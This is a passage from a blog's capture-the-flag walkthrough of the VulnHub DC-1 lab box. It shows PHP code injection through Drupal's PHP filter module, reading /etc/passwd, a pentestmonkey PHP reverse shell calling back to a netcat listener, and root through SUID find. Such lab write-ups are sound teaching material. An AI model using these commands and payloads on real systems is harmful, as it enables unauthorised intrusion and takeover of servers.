id=enumerating-drupal-admin-pages>Enumerating Drupal admin pages</h3><p>It&rsquo;s important to gather as much information as you can as it might come into handy later on&mldr; so let&rsquo;s see what we can find inside Drupal as admin.</p><ul><li>Username <em><strong>Fred</strong></em> found</li><li>Username <em><strong>admin</strong></em> found<ul><li>So brute forcing may have been an option but maybe it has lockout?</li></ul></li><li>flag3 is found under content&mldr;<ul><li><strong>Special PERMS will help FIND the passwd - but you&rsquo;ll need to -exec that command to work out how to get what&rsquo;s in the shadow.</strong></li><li>This seems to hint to maybe the find command allowing us access to certain files we shouldn&rsquo;t have access to? Sticky bit? Worth checking once we&rsquo;re in&mldr;</li></ul></li><li>Let&rsquo;s look in the module tab and see if there&rsquo;s anything php related&mldr;<ul><li>I found and enabled the follow module&mldr; &ldquo;PHP filter&rdquo;. It may just allow us to upload malicious PHP code.</li></ul></li></ul><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-1/php-module-enable-it.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-1/php-module-enable-it.png?size=small" data-sub-html="<h2>DC-1 Drupal 7 Enabled PHP Filter</h2><p>DC-1 Drupal 7 Enabled PHP Filter</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-1/php-module-enable-it.png srcset="/images/CTF/VulnHub/DC-Series/DC-1/php-module-enable-it.png?size=small, /images/CTF/VulnHub/DC-Series/DC-1/php-module-enable-it.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-1/php-module-enable-it.png?size=large 2x" sizes=auto data-title="DC-1 Drupal 7 Enabled PHP Filter" data-alt="DC-1 Drupal 7 Enabled PHP Filter" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>DC-1 Drupal 7 Enabled PHP Filter</figcaption></figure></p><ul><li>Not that it&rsquo;s enabled, we should see if we can give it administrator rights.. Click the &ldquo;Permissions&rdquo; and then check the &ldquo;administrator&rdquo; user box for &ldquo;Use the PHP code text format&rdquo;</li></ul><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-1/php-permissions.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-1/php-permissions.png?size=small" data-sub-html="<h2>DC-1 Drupal 7 PHP code permissions</h2><p>DC-1 Drupal 7 PHP code permissions</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-1/php-permissions.png srcset="/images/CTF/VulnHub/DC-Series/DC-1/php-permissions.png?size=small, /images/CTF/VulnHub/DC-Series/DC-1/php-permissions.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-1/php-permissions.png?size=large 2x" sizes=auto data-title="DC-1 Drupal 7 PHP code permissions" data-alt="DC-1 Drupal 7 PHP code permissions" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>DC-1 Drupal 7 PHP code permissions</figcaption></figure></p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-1/enable-php-code-admin.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-1/enable-php-code-admin.png?size=small" data-sub-html="<h2>DC-1 Drupal 7 admin perms for php code</h2><p>DC-1 Drupal 7 admin perms for php code</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-1/enable-php-code-admin.png srcset="/images/CTF/VulnHub/DC-Series/DC-1/enable-php-code-admin.png?size=small, /images/CTF/VulnHub/DC-Series/DC-1/enable-php-code-admin.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-1/enable-php-code-admin.png?size=large 2x" sizes=auto data-title="DC-1 Drupal 7 admin perms for php code" data-alt="DC-1 Drupal 7 admin perms for php code" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>DC-1 Drupal 7 admin perms for php code</figcaption></figure></p><ul><li>I&rsquo;m hoping by checking the admin box, this will allow any code inputted to be executed with admin privs.</li></ul><h3 id=exploiting-php-module>Exploiting PHP module</h3><ul><li>Now that it&rsquo;s enabled, lets see if we can create a PHP page under content. Maybe we can inject php code, like the php revshell by pentestmonkey! Or we may be able to grab the /etc/passwd file to see what users are on the box. Even better /etc/shadow file&mldr;, if we have root privs.. doubtful.<ul><li>Content > Add Content > Basic Page<ul><li>Title = Whatever you want</li><li>Body is where we&rsquo;ll test the injection&mldr;<ul><li><code>&lt;?php system("whoami"); ?></code></li></ul></li><li>Change &ldquo;Text Format&rdquo; to the PHP code module, which is what we enabled with admin privs<ul><li><p>Then press preview&mldr; let&rsquo;s see if we can grab the current user&mldr;</p><ul><li>We got a response! &ldquo;www-data&rdquo;. Injection is working!<figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-1/www-data-injection.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-1/www-data-injection.png?size=small" data-sub-html="<h2>DC-1 Drupal 7 PHP code injection!</h2><p>DC-1 Drupal 7 PHP code injection!</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-1/www-data-injection.png srcset="/images/CTF/VulnHub/DC-Series/DC-1/www-data-injection.png?size=small, /images/CTF/VulnHub/DC-Series/DC-1/www-data-injection.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-1/www-data-injection.png?size=large 2x" sizes=auto data-title="DC-1 Drupal 7 PHP code injection!" data-alt="DC-1 Drupal 7 PHP code injection!" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>DC-1 Drupal 7 PHP code injection!</figcaption></figure></li></ul></li><li><p>Let&rsquo;s change the command from <code>whoami</code> to <code>cat /etc/passwd</code>. Looks like another two users to notate. www-data and flag4<figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-1/php-injection-passwd.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-1/php-injection-passwd.png?size=small" data-sub-html="<h2>C-1 Drupal 7 PHP code injection - passwd file</h2><p>C-1 Drupal 7 PHP code injection - passwd file</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-1/php-injection-passwd.png srcset="/images/CTF/VulnHub/DC-Series/DC-1/php-injection-passwd.png?size=small, /images/CTF/VulnHub/DC-Series/DC-1/php-injection-passwd.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-1/php-injection-passwd.png?size=large 2x" sizes=auto data-title="C-1 Drupal 7 PHP code injection - passwd file" data-alt="C-1 Drupal 7 PHP code injection - passwd file" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>C-1 Drupal 7 PHP code injection - passwd file</figcaption></figure></p></li><li><p>Trying <code>sudo cat /etc/shadow</code> fails, so we don&rsquo;t have sudo or root privs. <em>Sudo may not even be installed</em></p></li></ul></li></ul></li></ul></li></ul><h3 id=php-revshell>PHP revshell</h3><ul><li>Now it&rsquo;s time to get ourselves a revshell through php injection&mldr; let&rsquo;s insert the following php code from this raw github file&mldr;<ul><li><p><a href=https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php target=_blank rel="external nofollow noopener noreferrer">PentestMonkey&rsquo;s PHP revshell</a></p></li><li><p>You&rsquo;ll want to modify the following lines of code to match up with your <code>nc -nvlp 1234</code> command. The PHP code will callback to netcat and allow us to connect via a shell on the DC-1 box. <em>You can change the ports to whatever you&rsquo;d like</em>.</p><ul><li>$ip = &lsquo;192.168.56.1&rsquo;; // CHANGE THIS</li><li>$port = 1234; // CHANGE THIS</li></ul></li><li><p>Now open up another terminal with the <code>nc -nvlp 1234</code>, I mentioned before.</p><ul><li>You should now have both:<ol><li>terminal with <code>nc -nvlp 1234</code> running.</li><li>Drupal Basic Page filled in with PentestMonkey&rsquo;s reverse php shell</li></ol></li></ul></li><li><p>Let&rsquo;s hit preview and we should get a revshell as www-data. If we do, we&rsquo;ll move onto privilege escalation.</p><ul><li>The Drupal page will likely hang, let it be. Minimize it and forget about it. If you refresh or close it, you&rsquo;ll lose your revshell.</li></ul></li></ul></li><li>We now have a revshell into the box but lacks tty! We&rsquo;ll fix this in the next section.<ul><li>Let&rsquo;s do a quick test by typing <code>whoami</code> into our new revshell. You should see &ldquo;www-data&rdquo;.<figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-1/no-tty.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-1/no-tty.png?size=small" data-sub-html="<h2>DC-1 Drupal 7 - revshell w/o tty</h2><p>DC-1 Drupal 7 - revshell w/o tty</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-1/no-tty.png srcset="/images/CTF/VulnHub/DC-Series/DC-1/no-tty.png?size=small, /images/CTF/VulnHub/DC-Series/DC-1/no-tty.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-1/no-tty.png?size=large 2x" sizes=auto data-title="DC-1 Drupal 7 - revshell w/o tty" data-alt="DC-1 Drupal 7 - revshell w/o tty" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>DC-1 Drupal 7 - revshell w/o tty</figcaption></figure></li></ul></li></ul><h2 id=privilege-escalation>Privilege Escalation</h2><p>At this point, we now have a revshell into DC-1 whom does not have root privs. We&rsquo;ll need to find a way to escalate the privs, so we can &lsquo;own&rsquo; the box!</p><h3 id=custom-tty>Custom tty</h3><ul><li><p>First thing I like to do is get a tty and make our local terminal not break connection even if you press CTRL+C.</p><ul><li><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></li><li><code>export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp</code></li><li><code>export TERM=xterm-256color</code></li><li><code>alias ll='ls -lsaht --color=auto'</code></li><li>Press Ctrl + Z to make it a background process</li><li><code>stty raw -echo;fg;reset</code></li><li><code>stty columns 200 rows 200</code></li></ul></li><li><p>Now that you have a tty shell, with alias ll, and you can&rsquo;t CTRL+C out of it on accident.. Let&rsquo;s get to privesc(privilege escalation) but before that let&rsquo;s update our &rsquo;notes&rsquo;<br></p><blockquote><p><strong>Box Name:</strong> DC-1<br><strong>IP:</strong> 192.168.56.110<br><strong>OS:</strong> Debian(Linux)<br><strong>Ports & Service:</strong><br><em><strong>80</strong></em> - Apache httpd 2.2.22 - Drupal CMS v7.24 - php 5.4.45-0+deb7u14 - mysql version?</p><blockquote><p><em><strong>Drupal</strong></em> -> Admin acct created owned:owned with Drupal 7.x SQLi exploit -> enabled php-code and created basic content to inject php-revshell giving us low-level shell. -> shifted into a tty that doesn&rsquo;t allow CTRL+C disconnects -> now time to dig into privesc</p></blockquote><p><em><strong>111</strong></em> - rpcbind<br><em><strong>43450</strong></em> - rpcbind related<br><em><strong>22</strong></em> - ssh - least attractive since we have no usernames, passwords, or keys</p><p>Found Users: Fred ; admin ; www-data ; flag4</p></blockquote><p>At this point, we want to look through the box and enumerate anything we can find. For time sake, we&rsquo;ll skip most of this.
We could transfer linpeas.sh to enumerate the system for us, but let&rsquo;s try without it.</p><ul><li>I like to look for binaries that have SUID or GUID perms.<ul><li>These SUIDs and GUIDs are binaries that have a perm set to <code>s</code> in the user or group column. What makes these binaries so attractive is that they are executed with the owner&rsquo;s privs(think root ðŸ˜ƒ) but can be accessible and executable by lower priv users/groups.</li><li>Once we produce a list of SUID/GUID binaries, we can check them against <a href=https://gtfobins.github.io target=_blank rel="external nofollow noopener noreferrer">GTFObins</a></li></ul></li></ul><h3 id=suid-search>SUID Search</h3><p>Let&rsquo;s look for SUID binaries!</p><ul><li><code>find / -perm -u=s -type f 2>/dev/null</code><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-1/SUID-binaries.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-1/SUID-binaries.png?size=small" data-sub-html="<h2>DC-1 Drupal 7 - SUID search</h2><p>DC-1 Drupal 7 - SUID search</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-1/SUID-binaries.png srcset="/images/CTF/VulnHub/DC-Series/DC-1/SUID-binaries.png?size=small, /images/CTF/VulnHub/DC-Series/DC-1/SUID-binaries.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-1/SUID-binaries.png?size=large 2x" sizes=auto data-title="DC-1 Drupal 7 - SUID search" data-alt="DC-1 Drupal 7 - SUID search" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>DC-1 Drupal 7 - SUID search</figcaption></figure></li><li>Here&rsquo;s the <code>find</code> binary. Look at the perms. You&rsquo;re looking for an <code>s</code> in place of the executable bit set for user group.<figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-1/find-SUID-bit.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-1/find-SUID-bit.png?size=small" data-sub-html="<h2>DC-1 Drupal 7 - SUID example</h2><p>DC-1 Drupal 7 - SUID example</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-1/find-SUID-bit.png srcset="/images/CTF/VulnHub/DC-Series/DC-1/find-SUID-bit.png?size=small, /images/CTF/VulnHub/DC-Series/DC-1/find-SUID-bit.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-1/find-SUID-bit.png?size=large 2x" sizes=auto data-title="DC-1 Drupal 7 - SUID example" data-alt="DC-1 Drupal 7 - SUID example" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>DC-1 Drupal 7 - SUID example</figcaption></figure></li></ul><h3 id=searching-gtfobins>Searching GTFObins</h3><p>Let&rsquo;s look on <a href=https://gtfobins.github.io target=_blank rel="external nofollow noopener noreferrer">GTFObins</a> to see if any of these binaries have a SUID exploit that obtains and holds elevated privs.<br>- /bin/mount - only has Sudo which isn&rsquo;t installed on the box. So, pass.
- /bin/ping - no SUID abuse<br>- /bin/su - no SUID abuse<br>- /bin/ping6 - isn&rsquo;t listed<br>- /bin/umount - isn&rsquo;t listed<br>- /usr/bin/at - no SUID abuse<br>- /usr/bin/chsh - isn&rsquo;t listed<br>- /usr/bin/passwd - isn&rsquo;t listed<br>- /usr/bin/newgrp - isn&rsquo;t listed<br>- /usr/bin/chfn - isn&rsquo;t listed<br>- /usr/bin/gpasswd - isn&rsquo;t listed<br>- /usr/bin/procmail - isn&rsquo;t listed<br>- /usr/bin/find - WE HAVE A HIT! SUID bit can be abused!<br>- command will be <code>/usr/bin/find -exec /bin/sh \; -quit</code></p><h3 id=abusing-the-suid>Abusing the SUID</h3><ul><li>Copy/paste <code>/usr/bin/find -exec /bin/sh \; -quit</code> in the tty remote shell you have running in your terminal and let&rsquo;s see if we can abuse the SUID bit to escalate privs to root&mldr;</li><li>$$$ - We have root!</li></ul></li></ul><h2 id=rooted>ROOTED!</h2><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-1/box-pwned.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-1/box-pwned.png?size=small" data-sub-html="<h2>DC-1 Drupal 7 - ROOTED!!!</h2><p>DC-1 Drupal 7 - ROOTED!!!</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-1/box-pwned.png srcset="/images/CTF/VulnHub/DC-Series/DC-1/box-pwned.png?size=small, /images/CTF/VulnHub/DC-Series/DC-1/box-pwned.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-1/box-pwned.png?size=large 2x" sizes=auto data-title="DC-1 Drupal 7 - ROOTED!!!" data-alt="DC-1 Drupal 7 - ROOTED!!!" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>DC-1 Drupal 7 - ROOTED!!!</figcaption></figure></p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span title="Updated on 2023-01-20 12:13:08">Updated on 01-20-2023&nbsp;</span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on Twitter" data-sharer=twitter data-url=https://PivotTheNet.GitHub.io/dc-1/ data-title="DC-1 of the DC Series" data-hashtags="CTF (self-hosted)"><i class="fa-brands fa-twitter fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); title="Share on Facebook" data-sharer=facebook data-url=https://PivotTheNet.GitHub.io/dc-1/ data-hashtag="CTF (self-hosted)"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); title="Share on Reddit" data-sharer=reddit data-url=https://PivotTheNet.GitHub.io/dc-1/><i class="fa-brands fa-reddit fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); title="Share on Evernote" data-sharer=evernote data-url=https://PivotTheNet.GitHub.io/dc-1/ data-title="DC-1 of the DC Series"><i class="fa-brands fa-evernote fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fa-solid fa-tags fa-fw me-1" aria-hidden=true></i><a href=/tags/ctf-self-hosted/ class=post-tag>CTF (self-hosted)</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/networking/ class=post-nav-item rel=prev title="Networking Basics"><i class="fa-solid fa-angle-left fa-fw" aria-hidden=true></i>Networking Basics</a>
<a href=/dc-2/ class=post-nav-item rel=next title="DC-2 of the DC Series">DC-2 of the DC Series<i class="fa-solid fa-angle-right fa-fw" aria-hidden=true></i></a></div></div></article></main><footer class=footer><div class=footer-container><div class="footer-line copyright order-5" itemscope itemtype=http://schema.org/CreativeWork><i class="fa-regular fa-copyright fa-fw" aria-hidden=true></i>
<span itemprop=copyrightYear>2022 - 2023</span><span class=author itemprop=copyrightHolder>
<a href=/>revsh3ll</a></span><span class="license footer-divider">Content = <a rel="license external nofollow noopener noreferrer" href=https://creativecommons.org/licenses/by-sa/4.0/deed.en target=_blank>CC BY-SA 4.0</a> | Coding = <a rel="license external nofollow noopener noreferrer" href=https://www.gnu.org/licenses/gpl-3.0.en.html target=_blank>GPLv3</a><br>Disclaimer: The knowledge and interests shared are for educational and informational purposes only!</span></div><div class="footer-line statistics order-2"><span class=site-time title='Website running ...'><i class="fa-solid fa-heartbeat fa-fw animate-icon" aria-hidden=true></i><span class="run-times ms-1">Website running ...</span></span></div></div></footer></div><div class=widgets><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role=button aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden=true></i><span class="variant-numeric d-none">0%</span></div></div><a href=https://github.com/PivotTheNet title="View my GitHub!" target=_blank rel="external nofollow" class="github-corner right d-none-mobile"><svg viewBox="0 0 250 250" aria-hidden="true"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentcolor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentcolor" class="octo-body"/></svg></a><div id=mask></div><div class=reading-progress-bar style=left:0;top:0></div><noscript><div class=noscript-warning>Theme FixIt works best with JavaScript enabled.</div></noscript></div><link rel=stylesheet href=/lib/pace/themes/blue/pace-theme-minimal.css><script src=/lib/autocomplete/autocomplete.min.js defer></script><script src=/lib/lunr/lunr.min.js defer></script><script src=/lib/twemoji/twemoji.min.js defer></script><script src=/lib/sharer/sharer.min.js async defer></script><script src=/lib/typeit/index.umd.js defer></script><script src=/lib/pace/pace.min.js async defer></script><script>window.config={autoBookmark:!0,code:{copyTitle:"Copy to clipboard",editLockTitle:"Lock editable code block",editUnLockTitle:"Unlock editable code block",editable:!0,maxShownLines:10},comment:{enable:!1},data:{"typeit-header-desktop":"./PivotTheNet","typeit-header-title-mobile":"./PivotTheNet"},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"},siteTime:"2022-07-23T12:00+07:00",twemoji:!0,typeit:{cursorChar:"_",cursorSpeed:1e3,data:{"typeit-header-desktop":["typeit-header-desktop"],"typeit-header-title-mobile":["typeit-header-title-mobile"]},duration:-1,loop:!1,speed:350}}</script><script src=/js/theme.min.js defer></script></body></html>